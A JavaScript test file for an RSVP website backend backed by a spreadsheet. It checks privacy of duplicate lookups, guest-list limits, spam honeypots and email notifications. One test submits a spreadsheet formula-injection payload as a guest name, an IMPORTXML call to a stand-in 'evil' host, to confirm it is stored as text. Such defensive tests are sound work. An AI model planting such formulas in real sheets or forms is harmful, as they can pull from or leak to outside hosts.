// The RSVP backend, run against a fake Sheet. Each journey is something a
// real guest (or a stranger who found the public endpoint) can do.
'use strict';
const { journey, check } = require('./lib');
const { fakeAppsScript, PARSED } = require('./fake-apps-script');

journey('Backend: guest types a phone number starting with + (stored as text, not #ERROR!)', async () => {
  const b = fakeAppsScript();
  check(b.post({ name: 'Alex Johnson', attending: 'yes', guestCount: '1', phone: '+1 555 0100', dietary: '-no nuts' }).result === 'success', 'saved');
  check(b.row('Alex Johnson').Phone === '+1 555 0100', `phone: ${b.row('Alex Johnson').Phone}`);
  check(b.row('Alex Johnson').Dietary === '-no nuts', 'dietary kept as text');
});

journey('Backend: a "name" that is a formula is stored as text, not run', async () => {
  const b = fakeAppsScript();
  b.post({ name: '=IMPORTXML("http://evil","//a")', attending: 'yes' });
  check(b.rows()[0].Name === '=IMPORTXML("http://evil","//a")' && b.rows()[0].Name !== PARSED, 'name as text');
});

journey('Backend: a stranger who knows a guest\'s name learns nothing private', async () => {
  const b = fakeAppsScript();
  b.post({ name: 'Alex Johnson', attending: 'yes', guestCount: '1', phone: '+1 555 0100', note: 'secret', dietary: 'nut allergy' });
  const r = b.post({ name: 'alex johnson', attending: 'no' });
  check(r.result === 'duplicate', 'duplicate');
  check(JSON.stringify(Object.keys(r.existing).sort()) === '["attending","guestCount"]', `fields returned: ${Object.keys(r.existing)}`);
  check(!/555|secret|nut/.test(JSON.stringify(r)), 'no private values');
});

journey('Backend: cancelling keeps the phone number and note on file', async () => {
  const b = fakeAppsScript();
  b.post({ name: 'Alex Johnson', attending: 'yes', guestCount: '1', phone: '+1 555 0100', note: 'see you there' });
  b.post({ name: 'Alex Johnson', attending: 'no', guestCount: '0', phone: '', note: '', isUpdate: true });
  const row = b.row('Alex Johnson');
  check(row.Attending === 'No' && row['Guest Count'] === '0', 'cancelled');
  check(row.Phone === '+1 555 0100' && row.Note === 'see you there', 'phone and note kept');
});

journey('Backend: with a Guests tab, uninvited names and over-max counts are refused', async () => {
  const b = fakeAppsScript({ guests: [{ name: 'Alex Johnson', max: 1 }] });
  check(b.post({ name: 'Not Invited', attending: 'yes' }).result === 'error', 'uninvited refused');
  check(b.post({ name: 'Alex Johnson', attending: 'yes', guestCount: '3' }).result === 'error', 'over max refused');
  check(b.post({ name: 'ALEX johnson', attending: 'yes', guestCount: '1' }).result === 'success', 'case-insensitive');
  check(b.rows()[0].Name === 'Alex Johnson', 'stored with the guest list spelling');
});

journey('Backend: bots, oversized text, emails', async () => {
  const b = fakeAppsScript({ notify: 'n@example.com', visa: 'v@example.com' });
  check(b.post({ name: 'Bot', attending: 'yes', honeypot: 'spam' }).result === 'success' && b.rows().length === 0, 'honeypot writes nothing');
  b.post({ name: 'Long', attending: 'yes', note: 'x'.repeat(5000) });
  check(b.row('Long').Note.length === 1000, 'capped at 1000');
  b.post({ name: 'Alex Johnson', attending: 'yes', guestCount: '1', visaLetter: 'yes' });
  b.post({ name: 'Alex Johnson', attending: 'yes', guestCount: '1', visaLetter: 'yes', isUpdate: true });
  check(b.mails.filter(m => m.to === 'v@example.com').length === 1, 'one visa email, not one per update');
  check(b.mails.some(m => /^New RSVP/.test(m.subject)) && b.mails.some(m => /^RSVP updated/.test(m.subject)), 'notifications');
  check(fakeAppsScript().mails.length === 0, 'emails off by default');
});

journey('Backend: a couple adds a question by adding one TEXT_FIELDS line (CUSTOMIZING.md)', async () => {
  const b = fakeAppsScript({
    extraHeaders: ['Meal'],
    // Exactly the edit CUSTOMIZING.md describes
    edit: code => code
      .replace('const NOTE_COL      = 11; // K — Note', 'const NOTE_COL      = 11; // K — Note\nconst MEAL_COL = 12; // L — Meal')
      .replace('  note:    NOTE_COL,\n};', '  note:    NOTE_COL,\n  meal: MEAL_COL,\n};'),
  });
  b.post({ name: 'Alex Johnson', attending: 'yes', meal: '=Fish' });
  check(b.row('Alex Johnson').Meal === '=Fish', `meal stored as text: ${b.row('Alex Johnson').Meal}`);
  const dup = b.post({ name: 'Alex Johnson', attending: 'yes' });
  check(!('meal' in dup.existing), 'new answer never returned');
  b.post({ name: 'Alex Johnson', attending: 'yes', meal: '', isUpdate: true });
  check(b.row('Alex Johnson').Meal === '=Fish', 'kept when blank on update');
});
